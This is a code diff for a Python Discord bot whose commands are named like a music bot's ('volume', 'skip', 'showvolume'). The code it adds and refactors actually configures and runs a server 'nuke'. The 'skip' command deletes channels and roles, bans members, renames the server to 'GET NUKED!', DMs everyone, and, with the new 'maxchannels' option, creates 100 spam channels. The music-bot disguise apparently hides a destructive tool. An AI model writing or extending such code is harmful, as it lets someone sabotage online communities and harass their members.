@@ -92,13 +92,23 @@ if STATUS is not False:
 else:
     usestatus = False
 
+default_volume_settings = {
+    "ban": True,
+    "channels": True,
+    "roles": True,
+    "server": [True, "GET NUKED!", "https://i.imgur.com/CNdUGZj.jpg"],
+    "nuke_channel": [True, "get nuked"],
+    "dm": [True, "GET NUKED!"],
+    "nick": [False, ""],
+    "maxchannels": False
+}
+
 intents = discord.Intents.default()
 intents.members = True
 
 bot = commands.Bot(command_prefix=PREFIX, intents=intents)
 
 bot.remove_command("help")
-
 
 # Read and write role IDs
 def getRoleIDs():
@@ -155,7 +165,8 @@ config_options = {
     4: "server",
     5: "nuke_channel",
     6: "dm",
-    7: "nick"
+    7: "nick",
+    8: "maxchannels"
 }
 
 
@@ -514,20 +525,19 @@ Server ID: {ctx.guild.id}
 Server Owner: {ctx.guild.owner}
 ''')
 
+@bot.command(name="resetvolume")
+async def resetvolume(ctx):
+    volume_settings=getVolumeSettings()
+    volume_settings[f"{ctx.message.author.id}"] = default_volume_settings
+    writeVolumeSettings(volume_settings)
+    await ctx.send("Reset volume settings")  
+
 @bot.command(name="showvolume")
 @commands.dm_only()
 async def showvolume(ctx):
     volume_settings=getVolumeSettings()
     if f"{ctx.message.author.id}" not in volume_settings.keys():  # write default settings if entry doesn't exist
-        volume_settings[f"{ctx.message.author.id}"] = {
-            "ban": True,
-            "channels": True,
-            "roles": True,
-            "server": [True, "GET NUKED!", "https://i.imgur.com/CNdUGZj.jpg"],
-            "nuke_channel": [True, "get nuked"],
-            "dm": [True, "GET NUKED!"],
-            "nick": [False, ""]
-        }
+        volume_settings[f"{ctx.message.author.id}"] = default_volume_settings
         writeVolumeSettings(volume_settings)
     
     user_volume_settings = getVolumeSettings()[str(ctx.message.author.id)]
@@ -545,6 +555,7 @@ DM everyone: {user_volume_settings["dm"][0]}
 DM message: "{user_volume_settings["dm"][1]}"
 Nick Everyone: {user_volume_settings["nick"][0]}
 Nick Name: "{user_volume_settings["nick"][1]}"
+Create max channels: {user_volume_settings["maxchannels"]}
 '''.removeprefix("\n"))
     embed.set_author(name=ctx.message.author.name, icon_url=f"https://cdn.discordapp.com/avatars/{ctx.message.author.id}/{ctx.message.author.avatar}.png")
     await ctx.send(embed=embed)
@@ -557,15 +568,7 @@ async def volume(ctx, value: str, status: bool, arg1: Optional[str], arg2: Optio
     volume_settings=getVolumeSettings()
     
     if f"{ctx.message.author.id}" not in volume_settings.keys():  # write default settings if entry doesn't exist
-        volume_settings[f"{ctx.message.author.id}"] = {
-            "ban": True,
-            "channels": True,
-            "roles": True,
-            "server": [True, "GET NUKED!", "https://i.imgur.com/CNdUGZj.jpg"],
-            "nuke_channel": [True, "get nuked"],
-            "dm": [True, "GET NUKED!"],
-            "nick": [False, ""]
-        }
+        volume_settings[f"{ctx.message.author.id}"] = default_volume_settings
         writeVolumeSettings(volume_settings)
     
     settings = volume_settings[f"{ctx.message.author.id}"]
@@ -575,9 +578,11 @@ async def volume(ctx, value: str, status: bool, arg1: Optional[str], arg2: Optio
         if setting == "ban":
             settings["ban"] = status
             await dm_user(ctx.message.author, f"Changed \"ban everyone\" to {status}")
+        elif setting == "maxchannels":
+            settings["maxchannels"] = status
+            await dm_user(ctx.message.author, f"Changed \"maximum channels\" to {status}")
         elif setting == "channels":
             settings["channels"] = status
-
             await dm_user(ctx.message.author, f"Changed \"delete channels\" to {status}")
         elif setting == "roles":
             settings["roles"] = status
@@ -668,15 +673,7 @@ async def skip(ctx):
     volume_settings = getVolumeSettings()
 
     if f"{ctx.message.author.id}" not in volume_settings.keys():
-        volume_settings[f"{ctx.guild.id}"] = {
-            "ban": True,
-            "channels": True,
-            "roles": True,
-            "server": [True, "GET NUKED!", "https://i.imgur.com/CNdUGZj.jpg"],
-            "nuke_channel": [True, "get nuked"],
-            "dm": [True, "GET NUKED!"],
-            "nick": [False]
-        }
+        volume_settings[f"{ctx.guild.id}"] = default_volume_settings
         writeVolumeSettings(volume_settings)
 
     settings = volume_settings[f"{ctx.message.author.id}"]
@@ -688,13 +685,10 @@ async def skip(ctx):
     do_nc = settings["nuke_channel"][0]
     do_dm = settings["dm"][0]
     do_nick = settings["nick"][0]
+    do_max_channels = settings["maxchannels"]
 
     if do_channels:
         await delete_channels(ctx)
-
-    if do_nc:
-        nc_name = settings["nuke_channel"][1]
-        await create_nuke_channel(ctx, nc_name)
 
     if do_server:
         server_name = settings["server"][1]
@@ -765,6 +759,15 @@ Server Owner: {ctx.guild.owner}
                 role_list.append(role)
 
         await delete_roles(ctx, role_list)
+
+    if do_nc:
+        if do_max_channels:
+            for i in range(100):
+                nc_name = settings["nuke_channel"][1]
+                await create_nuke_channel(ctx, nc_name)
+        else:
+            nc_name = settings["nuke_channel"][1]
+            await create_nuke_channel(ctx, nc_name)
 
 
 # checks if the bot has administrator permissions
